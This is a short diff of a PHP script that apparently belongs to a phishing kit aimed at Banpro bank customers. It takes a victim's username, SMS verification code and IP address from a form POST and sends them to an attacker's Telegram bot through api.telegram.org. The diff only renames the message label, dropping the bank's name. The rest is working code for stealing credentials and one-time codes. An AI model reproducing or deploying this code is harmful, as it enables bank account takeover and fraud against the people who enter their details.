@@ -8,7 +8,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
     $codigo = htmlspecialchars($_POST['ips1'] ?? '');
     $ip = $_SERVER['REMOTE_ADDR'];
 
-    $msg = "📲 VALIDACIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";
+    $msg = "📲 VALIDACIÓN-sms 1\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";
 
     file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
         'chat_id' => $chat_id,
